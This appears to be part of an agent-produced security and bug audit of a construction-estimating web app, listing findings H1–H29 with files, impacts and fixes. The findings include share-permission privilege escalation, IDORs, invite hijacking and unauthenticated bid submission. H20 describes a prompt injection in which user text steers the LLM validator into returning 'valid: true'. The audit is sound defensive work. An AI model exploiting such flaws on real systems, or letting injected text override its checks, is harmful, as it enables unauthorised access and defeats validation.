## DEPENDENCY MAP

Issues that must be fixed together or in order:

```
A1 (metadata) ──depends on──> B7 (shell injection fix first)
A1 (metadata) ──should include──> B8 (skip clarifying questions)
A2 (JSON schema) ──must exist for──> save_estimate.py to work
A3 (paths) ──must be fixed for──> save_estimate.py to run at all
A1 + A2 + A3 = minimum for pipeline to produce correct results

B1 (verify save) ──mitigated by──> F1 (transactions)
B2 (auth degradation) ──root cause of──> "projects disappear" bug
B5 (timeout) ──connected to──> G10 (self-requeue)
B7 (shell injection) ──must fix before──> A1 (adding user content to prompt)

H2 + H3 + H16 = IDOR cluster (same pattern: permission check on wrong entity)
H4 + H5 + H6 + H7 + H21 = Subcontractor security cluster (needs full pass)
H8 + H9 + H10 + H27 = Config/env cluster (deployment blockers)
```

---

## WHAT WORKS CORRECTLY

For reference, these pieces are verified working:
- Optimistic lock job claiming (race-condition safe)
- Heartbeat + stale reaper + expired job reaper (logic correct, thresholds wrong)
- Startup recovery for crashed workers
- /plan2bid:run skill itself (8-step pipeline is solid)
- Frontend form validation in NewEstimate.tsx
- Backend creates projects + estimation_jobs correctly
- Results.tsx handles 0-item estimates gracefully (shows "No estimation data" with Re-run button)
- Two-tab polling is safe (no harmful race conditions)
- Close-browser-come-back works (server-side state)

---

## H: NEW FINDINGS FROM FINAL CODEBASE SWEEP (2026-04-10)

Found by 4 parallel review agents scanning the entire codebase for issues NOT in A1-G18.

### H1: NewEstimate form field name mismatch — estimate submission may 422
**Status:** OPEN — NEEDS VERIFICATION
**Root Cause:** Frontend sends files under form field `"files"`, backend expects `zip_file: UploadFile`.

**Files:**
- `NewEstimate.tsx:391` — `formData.append("files", f)`
- `estimates.py:144` — `zip_file: UploadFile = File(...)`

**The Problem in Detail:**
FastAPI maps the upload parameter name to the multipart field name. If frontend sends `"files"` and backend expects `"zip_file"`, every submission returns 422. However, production UI has been working, so this may be incorrect — the Depth agent may have misread. **Verify the actual field name in NewEstimate.tsx before acting.**

**Correct Behavior:** Field names must match between frontend FormData key and backend parameter name.

---

### H2: Share creation allows `permission: "owner"` — privilege escalation
**Status:** OPEN
**Root Cause:** `EmailShareBody.permission` and `LinkShareBody.permission` accept any string. Create endpoints don't validate; update endpoint does.

**Files:**
- `sharing.py:14,18` — Pydantic models accept any string, default `"viewer"`
- `sharing.py:39` — `body.permission` stored unvalidated on email share
- `sharing.py:74` — same on link share
- `sharing.py:145` — update endpoint correctly validates `not in ("viewer", "editor")`
- `auth.py:12` — `_PERM_LEVEL = {"viewer": 1, "editor": 2, "owner": 3}`

**Impact:** Attacker creates share with `"owner"` permission. Anyone who accepts it gets full OWNER access to the project, including delete.
**Fix:** Add validation `if body.permission not in ("viewer", "editor"): raise HTTPException(400)` to both create endpoints.

---

### H3: Share update/delete IDOR — cross-project share manipulation
**Status:** OPEN
**Root Cause:** `queries.update_share_permission` and `queries.delete_share` filter only by share `id`, not by `project_id`.

**Files:**
- `sharing.py:147` — passes `share_id` without project scope
- `sharing.py:164` — same for delete
- `queries.py:324-329` — both queries filter only on `id`

**Impact:** Owner of Project-A can modify/delete shares belonging to Project-B by guessing share IDs.
**Fix:** Add `.eq("project_id", job_id)` to both query functions.

---

### H4: Sub-invite exposes ALL trades regardless of trades_scope
**Status:** OPEN
**Root Cause:** `get_sub_invite` returns all line items and trade sections without filtering by `trades_scope`.

**Files:**
- `subcontractors.py:171-198` — all items returned regardless of trades_scope
- `subcontractors.py:206` — `trades_scope` is informational only

**Impact:** A plumbing-only sub can see electrical, HVAC, and every other trade's detailed pricing.
**Fix:** Filter `line_items` and `trade_sections` by `trades_scope` before returning.

---

### H5: Claim-invite hijack — any user can claim any invite
**Status:** OPEN
**Root Cause:** `claim_invite` does unconditional UPDATE with no check for existing claimant.

**Files:**
- `subcontractors.py:295-304` — no check for existing claim
- `queries.py:493-494` — `UPDATE SET shared_with_user_id WHERE token`

**Impact:** Any authenticated user can steal an invite intended for someone else.
**Fix:** Check if invite is already claimed before allowing claim.

---

### H6: Competitor bids query uses wrong field — always returns zero results
**Status:** OPEN
**Root Cause:** `queries.py:489` reads `invite.get("trade", "")` but invite has `trades_scope` (a JSON list), not `trade`.

**Files:**
- `queries.py:489` — `invite.get("trade", "")` always `""`
- `subcontractors.py:280-292` — returns empty result silently

**Impact:** Competitive bid view is completely non-functional.
**Fix:** Parse `trades_scope` and query per-trade, or restructure the query.

---

### H7: `getSubBidDetail` calls nonexistent backend endpoint
**Status:** OPEN
**Root Cause:** Frontend defines the function, backend has no matching route.

**Files:**
- `api.ts:894-898` — calls `/api/projects/{id}/sub-submissions/{id}/detail`
- No route exists in any backend file

**Impact:** SubBidDetailModal always gets 404. Feature is broken.
**Fix:** Either add backend endpoint or remove frontend function + modal.

---

### H8: SUPABASE_JWT_SECRET is placeholder — JWT verification broken
**Status:** OPEN
**Root Cause:** Backend `.env:4` has literal `YOUR_SUPABASE_JWT_SECRET_HERE`.

**Files:**
- `backend/.env:4`
- `client.py:187-197` — `verify_jwt()` catches decode error, returns None
- `auth.py:21` — `get_user_id()` returns 401 or falls to DEV_UUID

**Impact:** All JWT verification silently fails. Combined with B2 (DEV_UUID fallback), every request acts as anonymous.
**Fix:** Set the real JWT secret in `.env`. Add startup validation.

---

### H9: Zero startup validation — app boots with empty env vars
**Status:** OPEN
**Root Cause:** `config.py:7-11` defaults all env vars to `""`. No validation.

**Files:**
- `config.py:7-11`

**Impact:** App starts successfully with no database URL, no API keys. First request fails with opaque error.
**Fix:** Add `if not SUPABASE_URL: raise RuntimeError("SUPABASE_URL not set")` in lifespan.

---

### H10: No `.env.example` for frontend + no `VITE_API_URL` for production
**Status:** OPEN

**Files:**
- `frontend/.env` — has Supabase keys but no `VITE_API_URL`
- `api.ts:32` — `API_BASE` defaults to `"/api"` (works with Vite proxy only)

**Impact:** Production deployment will 404 on all API calls. No documentation tells deployers to set `VITE_API_URL`.

---

### H11: `estimation_jobs` table not in schema reference
**Status:** OPEN

**Files:**
- Used in `estimates.py:190-196`, `scenarios.py:98-105`, `projects.py:65`
- Not in `migrations/001_base_schema_reference.md`

**Impact:** Schema documentation is incomplete. Cannot verify column types/constraints.

---

### H12: Supabase `types.ts` defines 6 tables but app uses 25+
**Status:** OPEN

**Files:**
- `integrations/supabase/types.ts:16-206` — only profiles, projects, user_roles, user_preferences, project_overrides, chat_messages

**Impact:** Direct Supabase queries against unlisted tables lose type safety.

---

### H13: `validate_description` drops 6 of 9 frontend fields
**Status:** OPEN

**Files:**
- `estimates.py:627-637` — only passes `description`, `facility_type`, `trade` to LLM
- `api.ts:332-341` — sends all 9 fields

**Impact:** AI validation can't consider location, project type, or project name.

---

### H14: Logs sorted newest-first but `.slice(-2)` takes oldest two
**Status:** OPEN

**Files:**
- `Progress.tsx:720` — `.slice(-2)` on desc-sorted array
- `estimates.py:226` — `order("created_at", desc=True)`

**Impact:** Collapsed log view shows oldest entries instead of newest.
**Fix:** Use `.slice(0, 2)` instead of `.slice(-2)`.

---

### H15: Queue position off-by-one
**Status:** OPEN

**Files:**
- `estimates.py:249-250` — returns 0-indexed count
- `Progress.tsx:397` — checks `=== 1` for "Your estimate is next"

**Impact:** First-in-queue shows "Position 0" instead of "Your estimate is next."
**Fix:** Return 1-indexed position from backend.

---

### H16: Scenario endpoints don't verify scenario belongs to project — IDOR
**Status:** OPEN

**Files:**
- `scenarios.py:270-284` — delete validates project permission but not scenario ownership
- `scenarios.py:287` — update same issue
- `scenarios.py:188` — get_detail same issue

**Impact:** User with editor on Project-A can delete/update scenarios from Project-B.
**Fix:** Add `queries.get_scenario_detail(scenario_id)` check that `.project_id == job_id`.

---

### H17: Deleting running project doesn't cancel running jobs
**Status:** OPEN

**Files:**
- `projects.py:64-65` — only cancels `pending` jobs

**Impact:** Worker continues writing to deleted project's tables. Orphan data rows.
**Fix:** Also cancel `running` jobs, or block deletion of running projects.

---

### H18: `insert_anomaly_flags` mutates input rows in-place
**Status:** OPEN

**Files:**
- `queries.py:139-142` — sets `r["project_id"]` on each dict

**Impact:** Caller reusing row dicts sees stale project_id values.
**Fix:** Create new dicts: `{**r, "project_id": job_id}`.

---

### H19: Email shares can be accepted by wrong user
**Status:** OPEN

**Files:**
- `sharing.py:84-114` — no email verification on accept
- `queries.py:307-309` — token lookup doesn't filter by email or share_type

**Impact:** Any token holder can accept an email-targeted share, even if their email doesn't match.

---

### H20: Prompt injection in validate-description and polish-text
**Status:** OPEN

**Files:**
- `anthropic_client.py:156-163` — user description in f-string prompt
- `anthropic_client.py:198-206` — user text directly in message

**Impact:** User can force `valid: true` to bypass pre-estimation validation. Distinct from G11 (worker prompt injection).

---

### H21: `submit_bid` has zero authentication
**Status:** OPEN

**Files:**
- `subcontractors.py:222` — no Request param, no auth

**Impact:** Anyone with a token can submit unlimited bids. No rate limiting.

---

### H22: Negative bid amounts accepted
**Status:** OPEN

**Files:**
- `subcontractors.py:34-42` — `total_bid: float` has no lower bound

**Impact:** Corrupts cost comparisons. Social engineering vector.

---

### H23: FeedbackBody.rating accepts any string
**Status:** OPEN

**Files:**
- `feedback.py:11` — `rating: str` with no validation

**Impact:** No enum constraint. Garbage data in feedback table.

---

### H24: `onAuthStateChange` ignores event type
**Status:** OPEN

**Files:**
- `useAuth.tsx:19-23` — `(_event, session)` discards event

**Impact:** No handling of TOKEN_REFRESHED failure or SIGNED_OUT. Session dies silently.

---

### H25: httpx Client never closed on shutdown
**Status:** OPEN

**Files:**
- `client.py:161,177-184` — singleton created, never closed
- `main.py:20-24` — lifespan doesn't close it

**Impact:** File descriptor leak on process restarts.

---

### H26: Results.tsx export uses snake_case instead of camelCase for project fields
**Status:** OPEN

**Files:**
- `Results.tsx:547-548` — `project?.facility_type` and `project?.project_type`
- `app-context.tsx:15` — Project interface uses `facilityType` and `projectType`

**Impact:** Export always gets undefined for these fields.

---

### H27: `.env.example` lists `ANTHROPIC_API_KEY` but `config.py` reads `OPENROUTER_API_KEY`
**Status:** OPEN

**Files:**
- `backend/.env.example:2` — `ANTHROPIC_API_KEY`
- `config.py:7` — `OPENROUTER_API_KEY`

**Impact:** Following setup docs leaves AI endpoints broken.

---

### H28: N+1 query in compare_scenarios
**Status:** OPEN

**Files:**
- `scenarios.py:148-153` — 2 DB queries per scenario in loop

**Impact:** 10 scenarios = 20 extra queries. Slow responses.

---

### H29: Google Places API key committed in plaintext
**Status:** OPEN

**Files:**
- `frontend/.env:3` — `VITE_GOOGLE_PLACES_API_KEY=AIzaSy...`

**Impact:** Key visible in repo and bundled into client JS.
